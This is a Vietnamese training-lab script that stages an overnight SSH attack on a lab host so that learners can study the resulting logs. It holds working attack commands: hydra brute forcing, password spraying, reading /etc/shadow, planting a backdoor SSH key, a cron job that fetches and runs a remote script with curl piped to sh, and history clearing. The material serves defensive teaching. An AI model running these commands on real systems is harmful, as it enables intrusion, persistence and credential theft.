# Lab 8 — DỰNG "một đêm bị dò SSH" trên lab7 (máy keodo đóng vai kẻ dò, chỉ trong LAN 192.168.56.0/24 của lab).
# Đồng hồ lab7 được TUA để một đêm diễn ra trong vài phút (NTP tắt trong lúc dựng). Người học đọc log, không cần đọc tệp này trước.
sudo timedatectl set-ntp false && sudo date -s '2026-11-24 22:41:00' >/dev/null && date
@keodo sshpass -p 'An-Lab-2026!' ssh -tt -o StrictHostKeyChecking=no -b 192.168.56.20 an@192.168.56.10 "echo 'An-Lab-2026!' | sudo -S -p '' bash -c 'useradd -m -s /bin/bash -c \"tai khoan thu cho dev\" test && echo test:qwerty123 | chpasswd'; true" 2>&1 | tr -d '\r' | grep -v '^$'
sudo date -s '2026-11-24 23:05:00' >/dev/null && date
@keodo hydra -L users.txt -P pass.txt -t 4 -I ssh://192.168.56.10 2>&1 | grep -E 'login tried|valid password|completed|ERROR' | tail -3
sudo date -s '2026-11-25 01:20:00' >/dev/null && date
@keodo for u in $(cat spray.txt); do sshpass -p '123456' ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no -o ConnectTimeout=5 -b 192.168.56.88 $u@192.168.56.10 true 2>/dev/null; done; echo "rải xong $(wc -l < spray.txt) tên"
sudo date -s '2026-11-25 03:41:00' >/dev/null && date
@keodo n=0; for p in $(cat test-pass.txt); do n=$((n+1)); if sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o PubkeyAuthentication=no -b 192.168.56.77 test@192.168.56.10 true 2>/dev/null; then echo "trúng sau $n lần: $p"; break; fi; sleep 4; done
@keodo yes y | ssh-keygen -q -t ed25519 -N '' -C 'x@kali' -f ~/.ssh/cua_sau >/dev/null 2>&1; sshpass -p 'qwerty123' ssh -tt -o StrictHostKeyChecking=no -b 192.168.56.77 test@192.168.56.10 "id; uname -a; grep -c bash /etc/passwd; ls /home; cat /etc/shadow; echo qwerty123 | sudo -S -p '' -l; mkdir -p ~/.ssh; echo '$(cat ~/.ssh/cua_sau.pub)' | tee -a ~/.ssh/authorized_keys >/dev/null; chmod 600 ~/.ssh/authorized_keys; true" 2>&1 | tr -d '\r' | grep -v '^$'
sudo date -s '2026-11-25 03:52:00' >/dev/null && date
@keodo ssh -tt -i ~/.ssh/cua_sau -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -b 192.168.56.77 test@192.168.56.10 "w -h | head -3; crontab -l 2>&1 | head -1; (crontab -l 2>/dev/null; echo '*/10 * * * * curl -s http://203.0.113.50/x.sh | sh') | crontab -; history -c; true" 2>&1 | tr -d '\r' | grep -v '^$'
sudo date -s '2026-11-25 07:58:00' >/dev/null && date
@keodo ssh -b 192.168.56.20 hv@192.168.56.10 'echo "hv vào ca sáng: $(date +%H:%M)"'
sudo timedatectl set-ntp true; sleep 8; timedatectl | grep -E 'synchronized|NTP service'
